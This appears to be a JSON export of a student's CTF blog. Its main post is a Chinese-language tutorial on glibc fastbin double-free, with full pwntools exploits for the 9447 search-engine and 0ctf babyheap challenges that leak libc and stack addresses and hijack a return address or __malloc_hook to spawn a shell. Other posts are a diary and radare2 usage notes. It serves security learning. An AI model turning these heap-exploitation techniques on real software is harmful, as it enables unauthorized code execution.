{"meta":{"title":"Room of Equirement","subtitle":"pwn what you want","description":"pwn菜鸡一枚","author":"Sirius Whiter","url":"http://siriuswhiter.tk"},"pages":[{"title":"About Me","date":"2018-08-24T04:15:58.000Z","updated":"2018-08-24T05:21:32.074Z","comments":true,"path":"about/index.html","permalink":"http://siriuswhiter.tk/about/index.html","excerpt":"","text":"I’m Sirius Whiter,a sophomore at CUG,pwn noob.Bosses do light spray.contact me at github:siriuswhiterFor the pwn is long and full of terrors"},{"title":"categories","date":"2018-08-24T04:17:06.000Z","updated":"2018-09-25T13:27:02.130Z","comments":true,"path":"categories/index.html","permalink":"http://siriuswhiter.tk/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-08-24T04:16:44.000Z","updated":"2018-09-25T13:26:11.605Z","comments":true,"path":"tags/index.html","permalink":"http://siriuswhiter.tk/tags/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-09-25T12:54:31.000Z","updated":"2018-09-25T13:09:27.033Z","comments":true,"path":"tags/index-1.html","permalink":"http://siriuswhiter.tk/tags/index-1.html","excerpt":"","text":"skills pwn RE"},{"title":"archives","date":"2018-08-24T04:17:49.000Z","updated":"2018-08-24T04:17:49.342Z","comments":true,"path":"archives/index.html","permalink":"http://siriuswhiter.tk/archives/index.html","excerpt":"","text":""}],"posts":[{"title":"Introduction to pwn2.1-fastbin_dup","slug":"introduction-to-pwn2-1-fastbin-dup","date":"2018-10-15T11:14:55.000Z","updated":"2018-10-18T08:23:15.658Z","comments":true,"path":"2018/10/15/introduction-to-pwn2-1-fastbin-dup/","link":"","permalink":"http://siriuswhiter.tk/2018/10/15/introduction-to-pwn2-1-fastbin-dup/","excerpt":"","text":"尽量去有秩序的入门堆。。。但大部分堆看起来都太痛苦了。。 fastbin_dup原理利用堆对fastbin的管理特性，当chunk在fastbin的表头时，再次释放会触发检测机制，防止double free，但是若不在表头，便不会有这个问题。产生这种结果的原因是： fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。 可以用how2heap的例子来理解： 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, &quot;This file demonstrates a simple double-free attack with fastbins.\\n&quot;); fprintf(stderr, &quot;Allocating 3 buffers.\\n&quot;); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\\n&quot;, a); fprintf(stderr, &quot;2nd malloc(8): %p\\n&quot;, b); fprintf(stderr, &quot;3rd malloc(8): %p\\n&quot;, c); fprintf(stderr, &quot;Freeing the first one...\\n&quot;); free(a); fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\\n&quot;, a, a); // free(a); fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\\n&quot;, b); free(b); fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\\n&quot;, a); free(a); fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&apos;ll get %p twice!\\n&quot;, a, b, a, a); fprintf(stderr, &quot;1st malloc(8): %p\\n&quot;, malloc(8)); fprintf(stderr, &quot;2nd malloc(8): %p\\n&quot;, malloc(8)); fprintf(stderr, &quot;3rd malloc(8): %p\\n&quot;, malloc(8));&#125; 运行结果为： 12345678910111213This file demonstrates a simple double-free attack with fastbins.Allocating 3 buffers.1st malloc(8): 0x556c7035b2602nd malloc(8): 0x556c7035b2803rd malloc(8): 0x556c7035b2a0Freeing the first one...If we free 0x556c7035b260 again, things will crash because 0x556c7035b260 is at the top of the free list.So, instead, we&apos;ll free 0x556c7035b280.Now, we can free 0x556c7035b260 again, since it&apos;s not the head of the free list.Now the free list has [ 0x556c7035b260, 0x556c7035b280, 0x556c7035b260 ]. If we malloc 3 times, we&apos;ll get 0x556c7035b260 twice!1st malloc(8): 0x556c7035b2602nd malloc(8): 0x556c7035b2803rd malloc(8): 0x556c7035b260 可以看出1st malloc分配的内存被分配了两次，这样就可以修改其fd指针来控制分配的chunk的位置或者其他什么的。 例题-9447-search-engine条件程序给出了三个选项。2可以输入一个自己指定长度的句子，然后可以用1来索引2中句子的单词，索引到之后可以选择是否删除该句子。 123456int menu()&#123; puts(&quot;1: Search with a word&quot;); puts(&quot;2: Index a sentence&quot;); return puts(&quot;3: Quit&quot;);&#125; inde a sentence.程序写的很复杂，看起来很揪心。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768int index_a_sentence()&#123; int v0; // eax __int64 v1; // rbp int v2; // er13 char *v3; // r12 signed __int64 v4; // rbx signed __int64 v5; // rbp _DWORD *v6; // rax int v7; // edx __int64 v8; // rdx __int64 v10; // rdx puts(&quot;Enter the sentence size:&quot;); v0 = get_num(); v1 = (unsigned int)(v0 - 1); v2 = v0; if ( (unsigned int)v1 &gt; 0xFFFD ) puts_(&quot;Invalid size&quot;); puts(&quot;Enter the sentence:&quot;); v3 = (char *)malloc(v2); read_until_newline((__int64)v3, v2, 0); v4 = (signed __int64)(v3 + 1); v5 = (signed __int64)&amp;v3[v1 + 2]; v6 = malloc(0x28uLL); v7 = 0; *(_QWORD *)v6 = v3; v6[2] = 0; *((_QWORD *)v6 + 2) = v3; v6[6] = v2; do &#123; while ( *(_BYTE *)(v4 - 1) != 32 ) &#123; v6[2] = ++v7;LABEL_4: if ( ++v4 == v5 ) goto LABEL_8; &#125; if ( v7 ) &#123; v10 = qword_6020B8; qword_6020B8 = (__int64)v6; *((_QWORD *)v6 + 4) = v10; v6 = malloc(0x28uLL); v7 = 0; *(_QWORD *)v6 = v4; v6[2] = 0; *((_QWORD *)v6 + 2) = v3; v6[6] = v2; goto LABEL_4; &#125; *(_QWORD *)v6 = v4++; &#125; while ( v4 != v5 );LABEL_8: if ( v7 ) &#123; v8 = qword_6020B8; qword_6020B8 = (__int64)v6; *((_QWORD *)v6 + 4) = v8; &#125; else &#123; free(v6); &#125; return puts(&quot;Added sentence&quot;);&#125; search word： 123456789101112131415161718192021222324252627282930313233343536void search_with_a_word()&#123; int v0; // ebp void *v1; // r12 __int64 i; // rbx char v3; // [rsp+0h] [rbp-38h] puts(&quot;Enter the word size:&quot;); v0 = get_num(); if ( (unsigned int)(v0 - 1) &gt; 0xFFFD ) puts_(&quot;Invalid size&quot;); puts(&quot;Enter the word:&quot;); v1 = malloc(v0); read_until_newline((__int64)v1, v0, 0); for ( i = qword_6020B8; i; i = *(_QWORD *)(i + 32) ) &#123; if ( **(_BYTE **)(i + 16) ) &#123; if ( *(_DWORD *)(i + 8) == v0 &amp;&amp; !memcmp(*(const void **)i, v1, v0) ) &#123; __printf_chk(1LL, &quot;Found %d: &quot;, *(unsigned int *)(i + 24)); fwrite(*(const void **)(i + 16), 1uLL, *(signed int *)(i + 24), stdout); putchar(10); puts(&quot;Delete this sentence (y/n)?&quot;); read_until_newline((__int64)&amp;v3, 2, 1); if ( v3 == 121 ) &#123; memset(*(void **)(i + 16), 0, *(signed int *)(i + 24)); free(*(void **)(i + 16)); puts(&quot;Deleted!&quot;); &#125; &#125; &#125; &#125; free(v1);&#125; get_num： 123456789101112131415161718__int64 get_num()&#123; __int64 result; // rax char *endptr; // [rsp+8h] [rbp-50h] char nptr; // [rsp+10h] [rbp-48h] unsigned __int64 v3; // [rsp+48h] [rbp-10h] v3 = __readfsqword(0x28u); read_until_newline((__int64)&amp;nptr, 48, 1); result = strtol(&amp;nptr, &amp;endptr, 0); if ( endptr == &amp;nptr ) &#123; __printf_chk(1LL, &quot;%s is not a valid number\\n&quot;, &amp;nptr); result = get_num(); &#125; __readfsqword(0x28u); return result;&#125; 分析get_num这个函数本身有漏洞，它将输入的最大48位字符串转化为数字，但是问题就是在确定字符串时是以结尾的null来判断的，所以我们如果输入48个字符的话，在报错时可能会将之后的栈内存打印出来从而泄露栈地址。 整个过程大概是以一个结构体来保存每个单词：(40个字节) 12345678struct words_struct &#123; addr* words_str; //单词字符串的起始位置(其实是在句子字符串当中的) int64_t size; // 单词大小 addr* ptr_to_sentences; //单词所在的句子字符串的位置 int64_t* size_of_sentences;//句子长度 words_struct* next_word;//链表下一个节点指针 &#125;; 在删除句子时，是将word_struct中ptr_to_sentences所指向的句子释放，但未置为null。在每次释放 i-&gt;sentence_ptr 之前，这个句子的内容就会全部被设置为 \\x00 ，由于单词结构体中存储的单词只是句子的一个指针，所以单词也会被置为 \\x00 。该句子对应的那些单词仍然是存在于链表中的，并没有被删除，因此每次搜索单词的时候，仍然会判断。看起来由于句子内容被置为 \\x00 可以防止通过 *i-&gt;sentence_ptr 验证。然而，由于 chunk 被释放后会被放到 bin 中，当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。此外，当句子被 memset 的时候，单词虽然都变为了 \\x00 ，但是我们仍然可以通过两个 \\x00 的比较来绕过 memcmp 的检测。 利用思路1) 利用get_num函数的漏洞试图泄露栈地址2) 泄露libc_address，从而计算出system 和 /bin/sh的地址3) 利用fastbin_dup 进行double free4) 利用double free来覆盖栈中的返回地址控制程序执行system(“/bin/sh”) 思路大抵如此，但是借鉴大佬的exp却都无法正常得到shell，不晓得哪里有问题，或许是环境不一样 exp先附上大佬写的exp，再多捋一捋思路，调试调试，去找到问题。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141#!/usr/bin/env python2from pwn import *context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)p = process(&apos;./search-bf61fbb8fa7212c814b2607a81a84adf&apos;)# binsh_offset 找不到pop_rdi_ret = 0x400e23system_offset = 0x46590puts_offset = 0x6fd60binsh_offset = 1558723def leak_stack(): p.sendline(&apos;A&apos;*48) p.recvuntil(&apos;Quit\\n&apos;) p.recvline() # doesn&apos;t work all the time p.sendline(&apos;A&apos;*48) leak = p.recvline().split(&apos; &apos;)[0][48:] return int(leak[::-1].encode(&apos;hex&apos;), 16)def leak_libc(): # this sentence is the same size as a list node index_sentence((&apos;a&apos;*12 + &apos; b &apos;).ljust(40, &apos;c&apos;)) # delete the sentence search(&apos;a&apos; * 12) p.sendline(&apos;y&apos;) # the node for this sentence gets put in the previous sentence&apos;s spot. # note we made sure this doesn&apos;t reuse the chunk that was just freed by # making it 64 bytes index_sentence(&apos;d&apos; * 64) # free the first sentence again so we can allocate something on top of it. # this will work because 1) the sentence no longer starts with a null byte # (in fact, it should be clear that it starts a pointer to 64 d&apos;s), and 2) # the location where our original string contained `b` is guaranteed to be # zero. this is because after the original sentence was zeroed out, nothing # was allocated at offset 12, which is just padding in the structure. if # we had made the first word in the string 16 bytes instead of 12, then that # would put &apos;b&apos; at a location where it would not be guaranteed to be zero. search(&apos;\\x00&apos;) p.sendline(&apos;y&apos;) # make our fake node node = &apos;&apos; node += p64(0x400E90) # word pointer &quot;Enter&quot; node += p64(5) # word length node += p64(0x602028) # sentence pointer (GOT address of free) node += p64(64) # length of sentence node += p64(0x00000000) # next pointer is null assert len(node) == 40 # this sentence gets allocated on top of the previous sentence&apos;s node. # we can thus control the sentence pointer of that node and leak memory. index_sentence(node) # this simply receives all input from the binary and discards it, which # makes parsing out the leaked address easier below. p.clean() # leak the libc address search(&apos;Enter&apos;) p.recvuntil(&apos;Found 64: &apos;) leak = u64(p.recvline()[:8]) p.sendline(&apos;n&apos;) # deleting it isn&apos;t necessary return leakdef index_sentence(s): p.sendline(&apos;2&apos;) p.sendline(str(len(s))) p.sendline(s)def search(s): p.sendline(&apos;1&apos;) p.sendline(str(len(s))) p.sendline(s)def make_cycle(): index_sentence(&apos;a&apos;*54 + &apos; d&apos;) index_sentence(&apos;b&apos;*54 + &apos; d&apos;) index_sentence(&apos;c&apos;*54 + &apos; d&apos;) search(&apos;d&apos;) p.sendline(&apos;y&apos;) p.sendline(&apos;y&apos;) p.sendline(&apos;y&apos;) search(&apos;\\x00&apos;) p.sendline(&apos;y&apos;) p.sendline(&apos;n&apos;)def make_fake_chunk(addr): # set the fwd pointer of the chunk to the address we want fake_chunk = p64(addr) index_sentence(fake_chunk.ljust(56))def allocate_fake_chunk(binsh_addr, system_addr): # allocate twice to get our fake chunk index_sentence(&apos;A&apos;*56) index_sentence(&apos;B&apos;*56) # overwrite the return address buf = &apos;A&apos;*30 buf += p64(pop_rdi_ret) buf += p64(binsh_addr) buf += p64(system_addr) buf = buf.ljust(56, &apos;C&apos;) index_sentence(buf)def main(): stack_leak = leak_stack() # This makes stack_addr + 0x8 be 0x40 //在泄露的栈地址附近寻找0x40用于充当fakechunk的size stack_addr = stack_leak + 0x5a - 8 log.info(&apos;stack leak: %s&apos; % hex(stack_leak)) log.info(&apos;stack addr: %s&apos; % hex(stack_addr)) libc_leak = leak_libc() libc_base = libc_leak - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offset log.info(&apos;libc leak: %s&apos; % hex(libc_leak)) log.info(&apos;libc_base: %s&apos; % hex(libc_base)) log.info(&apos;system addr: %s&apos; % hex(system_addr)) log.info(&apos;binsh addr: %s&apos; % hex(binsh_addr)) make_cycle() make_fake_chunk(stack_addr) allocate_fake_chunk(binsh_addr, system_addr) p.interactive()if __name__ == &apos;__main__&apos;: main() 例题-0ctfbabyheap条件炒鸡正规的条件选项题： 12345678./0ctfbabyheap ===== Baby Heap in 2017 =====1. Allocate2. Fill3. Free4. Dump5. ExitCommand: 分配的块可以分析出有一个结构体： 12345 struc_4 structure&#123; 00000000 inuse 00000001 size 00000002 ptr 00000003 &#125;struc_4 ends inuse可以标记块的释放与否，size记录大小，ptr指向分配的内存地址； 各个选项就不一一列举了，每个选项就如它名字一般：allocate使用calloc分配块，最大4096；fill填充用户指定allocate分配的块及新的size，所以很明显可以覆盖指针云云；free将inuse变为0，size归零，free掉指针，但是并未将其指向null；但是因为allocate时使用的是calloc将原空间置零，所以无法UAF。dump检测完inuse位，之后可以将size大小的ptr指向的地址的内容打印出来。 分析即使这个程序的漏洞这么明显，还是不知道怎么下手，满脑子unlink？？不过鉴于这是fastbin_dup处的学习，学学大佬们的思路。 目标：1.leak libc地址 2.利用fastbin_dup将chunk分配到malloc_hook处（malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过写 malloc_hook 来 getshell） 1234567891011gdb-peda$ x/20gx (long long)(&amp;main_arena)-0x300x7fa3a2008c10 &lt;_IO_wide_data_0+304&gt;: 0x00007fa3a2004d60 0x00000000000000000x7fa3a2008c20 &lt;__memalign_hook&gt;: 0x00007fa3a1ed4bf0 0x00007fa3a1ed51600x7fa3a2008c30 &lt;__malloc_hook&gt;: 0x0000000000000000 0x0000000000000000 &lt;-- malloc hook 0x7fa3a2008c40 &lt;main_arena&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c50 &lt;main_arena+16&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c60 &lt;main_arena+32&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c70 &lt;main_arena+48&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c80 &lt;main_arena+64&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c90 &lt;main_arena+80&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008ca0 &lt;main_arena+96&gt;: 0x000055b863881360 0x0000000000000000 exp经过不断的调试，确信本机无法复现成功，因为一块0x10大小的内存被free掉以后，再次alloc本应在free掉的地址处，但是本机却会新开辟一块地方。。所以没救了:( 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211#!/usr/bin/env python from pwn import *import sys context.log_level = &quot;debug&quot; elf = &quot;./0ctfbabyheap&quot;ENV = &#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125; p = process(elf) def alloc(size): p.recvuntil(&quot;Command: &quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;Size: &quot;) p.sendline(str(size)) def fill(idx, content): p.recvuntil(&quot;Command: &quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;Size: &quot;) p.sendline(str(len(content))) p.recvuntil(&quot;Content: &quot;) p.send(content) def free(idx): p.recvuntil(&quot;Command: &quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) def dump(idx): p.recvuntil(&quot;Command: &quot;) p.sendline(&quot;4&quot;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvline() return p.recvline() alloc(0x10)alloc(0x10)alloc(0x10)alloc(0x10)alloc(0x80) free(1)free(2) #gdb.attach(p)#main arena and heap #------------------------------------------------------------------------#gdb-peda$ x/20gx &amp;main_arena0x7f6dd27f3c40 &lt;main_arena&gt;: 0x0000000000000000 0x0000000000000000 //there is no fastbin[0],don&apos;t know why...0x7f6dd27f3c50 &lt;main_arena+16&gt;: 0x0000000000000000 0x00000000000000000x7f6dd27f3c60 &lt;main_arena+32&gt;: 0x0000000000000000 0x00000000000000000x7f6dd27f3c70 &lt;main_arena+48&gt;: 0x0000000000000000 0x00000000000000000x7f6dd27f3c80 &lt;main_arena+64&gt;: 0x0000000000000000 0x00000000000000000x7f6dd27f3c90 &lt;main_arena+80&gt;: 0x0000000000000000 0x00000000000000000x7f6dd27f3ca0 &lt;main_arena+96&gt;: 0x000056122eed1360 0x00000000000000000x7f6dd27f3cb0 &lt;main_arena+112&gt;: 0x00007f6dd27f3ca0 0x00007f6dd27f3ca00x7f6dd27f3cc0 &lt;main_arena+128&gt;: 0x00007f6dd27f3cb0 0x00007f6dd27f3cb00x7f6dd27f3cd0 &lt;main_arena+144&gt;: 0x00007f6dd27f3cc0 0x00007f6dd27f3cc0gdb-peda$ x/30gx 0x000056122eed12500x56122eed1250: 0x0000000000000000 0x0000000000000021 chunk 0,in use0x56122eed1260: 0x0000000000000000 0x00000000000000000x56122eed1270: 0x0000000000000000 0x0000000000000021 chunk 1,free0x56122eed1280: 0x0000000000000000 0x00000000000000000x56122eed1290: 0x0000000000000000 0x0000000000000021 chunk 2,free0x56122eed12a0: 0x000056122eed1280 &lt;-- chunk 2&apos;s fd pointer,point to chunk 1 0x00000000000000000x56122eed12b0: 0x0000000000000000 0x0000000000000021 chunk 3,in use0x56122eed12c0: 0x0000000000000000 0x00000000000000000x56122eed12d0: 0x0000000000000000 0x0000000000000091 chunk 4,in use0x56122eed12e0: 0x0000000000000000 0x00000000000000000x56122eed12f0: 0x0000000000000000 0x00000000000000000x56122eed1300: 0x0000000000000000 0x00000000000000000x56122eed1310: 0x0000000000000000 0x00000000000000000x56122eed1320: 0x0000000000000000 0x00000000000000000x56122eed1330: 0x0000000000000000 0x0000000000000000#------------------------------------------------------------------------#payload = p64(0)*3payload += p64(0x21)payload += p64(0)*3payload += p64(0x21)payload += p8(0xd0)fill(0, payload) payload = p64(0)*3payload += p64(0x21)fill(3, payload) #------------------------------------------------------------------------#gdb-peda$ x/30gx 0x000055b8638812500x55b863881250: 0x0000000000000000 0x00000000000000210x55b863881260: 0x0000000000000000 0x00000000000000000x55b863881270: 0x0000000000000000 0x00000000000000210x55b863881280: 0x0000000000000000 0x00000000000000000x55b863881290: 0x0000000000000000 0x00000000000000210x55b8638812a0: 0x000055b8638812d0 -| 0x0000000000000000 &lt;--chunk 2&apos;s fd pointer point to chunk 40x55b8638812b0: 0x0000000000000000 | 0x00000000000000210x55b8638812c0: 0x0000000000000000 | 0x00000000000000000x55b8638812d0: 0x0000000000000000 &lt;- 0x0000000000000021 &lt;-- 0x91 was changed to 0x21 by filling chunk 3 for cheating 0x55b8638812e0: 0x0000000000000000 0x00000000000000000x55b8638812f0: 0x0000000000000000 0x00000000000000000x55b863881300: 0x0000000000000000 0x00000000000000000x55b863881310: 0x0000000000000000 0x00000000000000000x55b863881320: 0x0000000000000000 0x00000000000000000x55b863881330: 0x0000000000000000 0x0000000000000000#------------------------------------------------------------------------#alloc(0x10) //chunk 2&apos;s address but its index is 1 alloc(0x10) //chunk 4&apos;s address but its index is 2payload = p64(0)*3payload += p64(0x91)fill(3, payload) // change backalloc(0x80) //chunk 5free(4) libc_base = u64(dump(2)[:8].strip().ljust(8, &quot;\\x00&quot;))-0x195c98 //0x58 +(0x7fc47fa61c40 - 0x7fc47f8cc000 ) log.info(&quot;libc_base: &quot;+hex(libc_base)) #------------------------------------------------------------------------#gdb-peda$ p main_arena$1 = &#123; mutex = 0x0, flags = 0x0, have_fastchunks = 0x0, fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, top = 0x55dcc4edc430, last_remainder = 0x0, bins = &#123;...&#125; binmap = &#123;0x0, 0x0, 0x0, 0x0&#125;, next = 0x7fc47fa61c40 &lt;main_arena&gt;, &lt;------------## main_arena address next_free = 0x0, attached_threads = 0x1, system_mem = 0x21000, max_system_mem = 0x21000&#125;gdb-peda$ vmmapStart End Perm Name0x00003b8f7c613000 0x00003b8f7c614000 rw-p mapped0x000055dcc365b000 0x000055dcc365d000 r-xp /root/heap/0ctfbabyheap0x000055dcc385c000 0x000055dcc385d000 r--p /root/heap/0ctfbabyheap0x000055dcc385d000 0x000055dcc385e000 rw-p /root/heap/0ctfbabyheap0x000055dcc4edc000 0x000055dcc4efd000 rw-p [heap]0x00007fc47f8aa000 0x00007fc47f8cc000 r--p /usr/lib/x86_64-linux-gnu/libc-2.27.so // I don&apos;t really know what address we need.0x00007fc47f8cc000 0x00007fc47fa12000 r-xp /usr/lib/x86_64-linux-gnu/libc-2.27.so0x00007fc47fa12000 0x00007fc47fa5d000 r--p /usr/lib/x86_64-linux-gnu/libc-2.27.so0x00007fc47fa5d000 0x00007fc47fa61000 r--p /usr/lib/x86_64-linux-gnu/libc-2.27.so0x00007fc47fa61000 0x00007fc47fa63000 rw-p /usr/lib/x86_64-linux-gnu/libc-2.27.so0x00007fc47fa63000 0x00007fc47fa67000 rw-p mapped0x00007fc47fa67000 0x00007fc47fa69000 rw-p mapped0x00007fc47fa8a000 0x00007fc47fa8b000 r--p /usr/lib/x86_64-linux-gnu/ld-2.27.so0x00007fc47fa8b000 0x00007fc47faa9000 r-xp /usr/lib/x86_64-linux-gnu/ld-2.27.so0x00007fc47faa9000 0x00007fc47fab1000 r--p /usr/lib/x86_64-linux-gnu/ld-2.27.so0x00007fc47fab1000 0x00007fc47fab2000 r--p /usr/lib/x86_64-linux-gnu/ld-2.27.so0x00007fc47fab2000 0x00007fc47fab3000 rw-p /usr/lib/x86_64-linux-gnu/ld-2.27.so0x00007fc47fab3000 0x00007fc47fab4000 rw-p mapped0x00007ffd42afd000 0x00007ffd42b1e000 rw-p [stack]0x00007ffd42bee000 0x00007ffd42bf1000 r--p [vvar]0x00007ffd42bf1000 0x00007ffd42bf3000 r-xp [vdso]#------------------------------------------------------------------------##alloc(0x60)free(4) payload = p64(libc_base+0x3c4aed) //malloc_hook&apos;s 0x000000007f address - 0x8 fill(2, payload) alloc(0x60)alloc(0x60) payload = p8(0)*3 //using offset wisely make 0x7f***** as fake size &apos;0x000000007f&apos;payload += p64(0)*2payload += p64(libc_base+0x4345e) //tools called &apos;one_gadget&apos; can help get execv(&apos;/bin/sh&apos;) directly;fill(6, payload) #------------------------------------------------------------------------#root@kali:~/heap# ldd ./0ctfbabyheap linux-vdso.so.1 (0x00007ffd59ff6000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007faf4646f000) /lib64/ld-linux-x86-64.so.2 (0x00007faf46852000) root@kali:~/heap# one_gadget /lib/x86_64-linux-gnu/libc.so.60x4345e execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x434b2 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xe42ee execve(&quot;/bin/sh&quot;, rsp+0x60, environ)constraints: [rsp+0x60] == NULL#------------------------------------------------------------------------#alloc(255) p.interactive() reference:https://blog.csdn.net/qq_35519254/article/details/78213962?utm_source=blogxgwz1https://bbs.pediy.com/thread-223461.htm 没有人指导堆的学习，日常入门到入土，太难受了。主要是前天打比赛结果很惨烈，希望能加把劲把基础的堆问题给解决掉，下次比赛尽量能够解决一些堆的题。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Diary.20181008","slug":"diary-20181008","date":"2018-10-08T13:10:48.000Z","updated":"2018-10-15T12:17:30.737Z","comments":true,"path":"2018/10/08/diary-20181008/","link":"","permalink":"http://siriuswhiter.tk/2018/10/08/diary-20181008/","excerpt":"","text":"下午摸了一道题，比较简单的格式化字符串；之后摸手机端的 termux ，试图在上面安装 nmap，metasploit；nmap还是很顺利的，但是metasploit搞到自闭……各种安装包问题，一步一步的找问题找解决方法才好不容易把解决；黑域brevent也搞了半天，最后我还是选择绿色守护……手机最近掉电掉的有点严重，必须管一管了；配合帅气的termux，搞了个hacker’s keyboard ，打起字来方便了不少， 还换了个hacker live wallpaper，也就是像是黑客帝国那样的动态壁纸，hhhh整个手机炫酷了不少。周四林少华老师要来学校做客震旦讲堂！！！一定要过去，顺便看能不能混个签名hhh …搞了半天特定文章的加密，反而全都无法通过，搞不懂怎么回事…真麻烦 12345678910&lt;script&gt; (function()&#123; if(&apos;&#123;&#123; page.password&#125;&#125;&apos; !== 0)&#123; if (prompt(&apos;PASSWORD&apos;) !== &apos;&#123;&#123; page.password &#125;&#125;&apos;)&#123; alert(&apos;Wrong！&apos;); history.back(); &#125; &#125; &#125;)();&lt;/script&gt; 上面这个运用js的alert阻断机制，但是会把我所有文章都加密。。这下好了，越来越糟糕 hexo-blog-encrypt 这个组件都不能用。。没办法了","categories":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/categories/diary/"}],"tags":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/tags/diary/"}]},{"title":"Radare2","slug":"radare2","date":"2018-09-25T02:56:08.000Z","updated":"2018-09-25T13:44:05.207Z","comments":true,"path":"2018/09/25/radare2/","link":"","permalink":"http://siriuswhiter.tk/2018/09/25/radare2/","excerpt":"","text":"之前听闻学长说许多大佬都用这个工具？(雾；就没事来瞎搞一搞这个可以用来逆向或pwn的神器？感觉还是很帅的hhhh，就是用起来有点emmm 安装git clone r2仓库即可，尽量每天使用前 ./sys/install.sh 更新一下 123$ git clone https://github.com/radare/radare2.git$ cd radare2$ ./sys/install.sh 使用之后学习使用中逐渐更新常用包含工具： radare2-&gt;整合了所有工具 rabin2-&gt;查看文件格式的 radiff2-&gt;比较文件不同的 rahash2-&gt;各种密码算法，hash算法集成 rasm2-&gt;汇编和反汇编 ragg2-&gt;开发shellcode工具(radare2自己编写的编译器) radare2随便加载个文件,会有一句欢迎语hhhh 123$r2 pwnme -- We only have bugs, features are an unintended side-effect[0x08049090]&gt; //工具找到的入口位置 rabin2查看文件基本信息 123456789101112131415161718192021222324252627282930# rabin2 -I pwnmearch x86baddr 0x8048000binsz 14275bintype elfbits 32canary falsesanitiz falseclass ELF32crypto falseendian littlehavecode trueintrp /lib/ld-linux.so.2lang clinenum truelsyms truemachine Intel 80386maxopsz 16minopsz 1nx trueos linuxpcalign 0pic falserelocs truerelro partialrpath NONEstatic falsestripped falsesubsys linuxva true rahash2支持超多加解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# rahash2 -L //列举Available Hashes: h md5h sha1h sha256h sha384h sha512h md4h xorh xorpairh parityh entropyh hamdisth pcprinth mod255h xxhashh adler32h luhnh crc8smbush crc15canh crc16h crc16hdlch crc16usbh crc16citth crc24h crc32h crc32ch crc32ecma267h crc32bzip2h crc32dh crc32mpeg2h crc32posixh crc32qh crc32jamcrch crc32xferh crc64h crc64ecmah crc64weh crc64xzh crc64isoAvailable Encoders/Decoders: e base64e base91e punycodeAvailable Crypto Algos: c rc2c rc4c rc6c aes-ecbc aes-cbcc rorc rolc rotc blowfishc cps2c des-ecbc xorc serpent-ecb# rahash2 -a md5 ./pwnme //生成md5哈希./pwnme: 0x00000000-0x00003c73 md5: 2569b37607fc52065f5b4e7c349d0e56 rasm2支持汇编反汇编 ragg2据说可以用来快速开发shellcode？ radiff2支持二进制文件的字节级或增量差异对比，查找基本代码块中的更改。 P.S.暂时不晓得有啥用 rafind2在文件中查找字节模式 rarun2用于在不同环境中运行程序的启动器，具有不同的参数，权限，目录和 覆盖的默认文件描述符。 rarun2可用于： * 破解小程序 * 模糊测试 * 测试组件 rax2用于shell的简约数学表达式求值器，用于在浮点值，十六进制表示， 十六进制字符串到ASCII之间进行基本转换，八进制到整数等。 它还支持字节顺序设置，如果没有参数，可以用作交互式shell 给出。 常用命令 i 开头的命令主要是用来获取各种信息。iz – 列出数据段里的字符串 1234567891011[0x08049090]&gt; ie[Entrypoints]vaddr=0x08049090 paddr=0x00001090 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program1 entrypoints[0x08049090]&gt; iz[Strings]Num Vaddr Paddr Len Size Section Type String000 0x00002008 0x0804a008 7 8 (.rodata) ascii /bin/sh001 0x00002010 0x0804a010 5 6 (.rodata) ascii input a 开头的命令主要是用来分析文件。radare2 